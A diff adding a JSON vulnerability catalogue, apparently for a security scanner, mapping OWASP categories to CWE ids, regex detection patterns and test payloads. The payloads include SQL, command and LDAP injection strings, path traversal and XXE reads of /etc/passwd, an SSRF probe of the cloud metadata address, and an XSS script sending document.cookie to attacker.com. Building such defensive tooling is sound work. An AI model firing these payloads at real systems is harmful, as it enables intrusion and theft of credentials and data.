@@ -1,0 +1,313 @@
+{
+  "version": "1.0.0",
+  "last_updated": "2025-10-31",
+  "categories": {
+    "injection": {
+      "name": "Injection Attacks",
+      "owasp": "A03:2021",
+      "vectors": [
+        {
+          "id": "INJ-001",
+          "name": "SQL Injection",
+          "cwe": "CWE-89",
+          "severity": "CRITICAL",
+          "detection_patterns": [
+            "f\".*SELECT.*{.*}\"",
+            "f\".*INSERT.*{.*}\"",
+            "\\.execute\\([\"'].*\\+.*[\"']",
+            "\\.execute\\(f[\"'].*\\{.*\\}.*[\"']"
+          ],
+          "test_payloads": [
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' #",
+            "admin' --",
+            "' UNION SELECT NULL--"
+          ]
+        },
+        {
+          "id": "INJ-002",
+          "name": "NoSQL Injection",
+          "cwe": "CWE-943",
+          "severity": "HIGH",
+          "detection_patterns": [
+            "db\\.collection\\.find\\(\\{.*req\\.",
+            "Model\\.find\\(req\\."
+          ],
+          "test_payloads": [
+            "{\"$ne\": null}",
+            "{\"$gt\": \"\"}",
+            "{\"$regex\": \".*\"}"
+          ]
+        },
+        {
+          "id": "INJ-003",
+          "name": "Command Injection",
+          "cwe": "CWE-78",
+          "severity": "CRITICAL",
+          "detection_patterns": [
+            "os\\.system\\(",
+            "subprocess\\.call\\(.*shell=True",
+            "exec\\(",
+            "eval\\("
+          ],
+          "test_payloads": [
+            "; ls -la",
+            "| cat /etc/passwd",
+            "$(whoami)",
+            "& ping -c 10 127.0.0.1"
+          ]
+        },
+        {
+          "id": "INJ-004",
+          "name": "LDAP Injection",
+          "cwe": "CWE-90",
+          "severity": "HIGH",
+          "test_payloads": [
+            "*",
+            "*)(&",
+            "*)(uid=*))(|(uid=*"
+          ]
+        }
+      ]
+    },
+    "xss": {
+      "name": "Cross-Site Scripting",
+      "owasp": "A03:2021",
+      "vectors": [
+        {
+          "id": "XSS-001",
+          "name": "Reflected XSS",
+          "cwe": "CWE-79",
+          "severity": "HIGH",
+          "detection_patterns": [
+            "innerHTML.*user",
+            "document\\.write\\(.*\\)",
+            "\\$\\(.*\\)\\.html\\("
+          ],
+          "test_payloads": [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg/onload=alert('XSS')>"
+          ]
+        },
+        {
+          "id": "XSS-002",
+          "name": "Stored XSS",
+          "cwe": "CWE-79",
+          "severity": "CRITICAL",
+          "test_payloads": [
+            "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
+          ]
+        },
+        {
+          "id": "XSS-003",
+          "name": "DOM-based XSS",
+          "cwe": "CWE-79",
+          "severity": "MEDIUM",
+          "detection_patterns": [
+            "location\\.hash",
+            "location\\.search",
+            "window\\.location"
+          ]
+        }
+      ]
+    },
+    "authentication": {
+      "name": "Authentication Issues",
+      "owasp": "A07:2021",
+      "vectors": [
+        {
+          "id": "AUTH-001",
+          "name": "Weak Password Hashing",
+          "cwe": "CWE-326",
+          "severity": "CRITICAL",
+          "detection_patterns": [
+            "hashlib\\.md5\\(",
+            "hashlib\\.sha1\\(",
+            "md5\\(",
+            "sha1\\("
+          ]
+        },
+        {
+          "id": "AUTH-002",
+          "name": "Predictable Session Token",
+          "cwe": "CWE-340",
+          "severity": "HIGH",
+          "detection_patterns": [
+            "session_id\\s*=\\s*str\\(time",
+            "token\\s*=\\s*str\\(random"
+          ]
+        },
+        {
+          "id": "AUTH-003",
+          "name": "Missing Authentication",
+          "cwe": "CWE-306",
+          "severity": "CRITICAL",
+          "detection_patterns": [
+            "@app\\.route.*without.*@login_required",
+            "def.*admin.*without.*auth"
+          ]
+        }
+      ]
+    },
+    "access_control": {
+      "name": "Broken Access Control",
+      "owasp": "A01:2021",
+      "vectors": [
+        {
+          "id": "AC-001",
+          "name": "IDOR (Insecure Direct Object Reference)",
+          "cwe": "CWE-639",
+          "severity": "HIGH",
+          "detection_patterns": [
+            "@app\\.route.*<.*id>.*",
+            "get\\(id\\).*without.*ownership"
+          ]
+        },
+        {
+          "id": "AC-002",
+          "name": "Path Traversal",
+          "cwe": "CWE-22",
+          "severity": "HIGH",
+          "detection_patterns": [
+            "open\\(.*\\+.*filename",
+            "open\\(f.*\\{filename\\}"
+          ],
+          "test_payloads": [
+            "../../../etc/passwd",
+            "..\\\\..\\\\..\\\\windows\\\\win.ini",
+            "....//....//etc/passwd"
+          ]
+        }
+      ]
+    },
+    "cryptography": {
+      "name": "Cryptographic Failures",
+      "owasp": "A02:2021",
+      "vectors": [
+        {
+          "id": "CRYPTO-001",
+          "name": "Weak Encryption Algorithm",
+          "cwe": "CWE-327",
+          "severity": "HIGH",
+          "detection_patterns": [
+            "DES\\.MODE_ECB",
+            "Cipher\\.DES",
+            "RC4",
+            "MD5"
+          ]
+        },
+        {
+          "id": "CRYPTO-002",
+          "name": "Hardcoded Secrets",
+          "cwe": "CWE-798",
+          "severity": "CRITICAL",
+          "detection_patterns": [
+            "password\\s*=\\s*[\"'][^\"']+[\"']",
+            "api[_-]?key\\s*=\\s*[\"'][^\"']+[\"']",
+            "secret\\s*=\\s*[\"'][^\"']+[\"']",
+            "sk-[a-zA-Z0-9]{32,}",
+            "AKIA[0-9A-Z]{16}"
+          ]
+        }
+      ]
+    },
+    "security_misconfiguration": {
+      "name": "Security Misconfiguration",
+      "owasp": "A05:2021",
+      "vectors": [
+        {
+          "id": "CONFIG-001",
+          "name": "Debug Mode Enabled",
+          "cwe": "CWE-489",
+          "severity": "MEDIUM",
+          "detection_patterns": [
+            "DEBUG\\s*=\\s*True",
+            "app\\.debug\\s*=\\s*True"
+          ]
+        },
+        {
+          "id": "CONFIG-002",
+          "name": "CORS Misconfiguration",
+          "cwe": "CWE-942",
+          "severity": "MEDIUM",
+          "detection_patterns": [
+            "Access-Control-Allow-Origin:\\s*\\*",
+            "CORS\\(.*origins=.*\\*"
+          ]
+        },
+        {
+          "id": "CONFIG-003",
+          "name": "Missing Security Headers",
+          "cwe": "CWE-693",
+          "severity": "LOW",
+          "detection_patterns": [
+            "X-Frame-Options",
+            "Content-Security-Policy",
+            "Strict-Transport-Security"
+          ]
+        }
+      ]
+    },
+    "ssrf": {
+      "name": "Server-Side Request Forgery",
+      "owasp": "A10:2021",
+      "vectors": [
+        {
+          "id": "SSRF-001",
+          "name": "SSRF via User Input",
+          "cwe": "CWE-918",
+          "severity": "HIGH",
+          "detection_patterns": [
+            "requests\\.get\\(.*user",
+            "urllib\\.request\\.urlopen\\(.*user"
+          ],
+          "test_payloads": [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://localhost/admin",
+            "file:///etc/passwd"
+          ]
+        }
+      ]
+    },
+    "xxe": {
+      "name": "XML External Entity",
+      "owasp": "A05:2021",
+      "vectors": [
+        {
+          "id": "XXE-001",
+          "name": "XXE Injection",
+          "cwe": "CWE-611",
+          "severity": "HIGH",
+          "detection_patterns": [
+            "lxml\\.etree\\.parse\\(",
+            "xml\\.etree\\.ElementTree\\.parse\\("
+          ],
+          "test_payloads": [
+            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+          ]
+        }
+      ]
+    },
+    "deserialization": {
+      "name": "Insecure Deserialization",
+      "owasp": "A08:2021",
+      "vectors": [
+        {
+          "id": "DESER-001",
+          "name": "Unsafe Pickle",
+          "cwe": "CWE-502",
+          "severity": "CRITICAL",
+          "detection_patterns": [
+            "pickle\\.loads\\(",
+            "yaml\\.load\\(",
+            "json\\.loads\\(.*user"
+          ]
+        }
+      ]
+    }
+  },
+  "custom_vectors": []
+}
+
